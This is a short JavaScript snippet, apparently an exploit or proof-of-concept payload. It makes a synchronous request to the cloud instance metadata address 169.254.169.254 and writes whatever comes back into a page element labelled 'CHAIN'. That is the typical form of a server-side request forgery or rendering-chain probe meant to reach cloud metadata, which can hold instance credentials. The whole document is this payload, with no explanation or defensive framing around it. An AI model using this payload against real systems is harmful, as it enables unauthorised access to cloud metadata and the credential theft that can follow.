var r=document.getElementById('out');
var x=new XMLHttpRequest();
x.open('GET','http://169.254.169.254/latest/meta-data/',false);
try{x.send();r.textContent='CHAIN:'+x.responseText;}
catch(e){r.textContent='CHAIN_ERR:'+e.message;}
